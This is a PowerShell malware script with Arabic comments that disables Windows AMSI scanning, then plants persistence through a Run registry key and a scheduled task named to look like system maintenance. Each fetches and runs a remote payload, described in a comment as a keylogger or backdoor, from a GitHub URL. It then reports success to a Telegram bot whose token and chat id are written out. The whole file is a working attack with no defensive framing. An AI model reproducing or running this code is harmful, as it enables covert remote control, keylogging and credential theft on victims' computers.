# --- [1] كسر الحماية الذكي ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات العميل والروابط ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"
# رابط الملف اللي عاوزه يشتغل علطول (مثلاً الكيلوجر أو الباكدور)
$payloadUrl = "https://raw.githubusercontent.com/malakmikhail710-cloud/Win-Updates/refs/heads/main/Key.ps1"

# --- [3] ميكانيكا الزرع في جذور النظام (Persistence) ---
$taskName = "WinUpdateManager"
$trigger = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('$payloadUrl')`""

# الطريقة الأولى: الزرع في الـ Registry (للمستخدم الحالي)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name $taskName -Value $trigger

# الطريقة الثانية: عمل Scheduled Task (مهمة مجدولة) كل ساعة
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('$payloadUrl')`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemHealthFix" -Description "Maintains System Integrity" -User "System" -Force

# --- [4] تأكيد الزرع للبوت ---
curl.exe -X POST "https://api.telegram.org/bot$t/sendMessage" -d "chat_id=$c&text=🛡️ Module 07: Persistence Established. I am now Immortal."
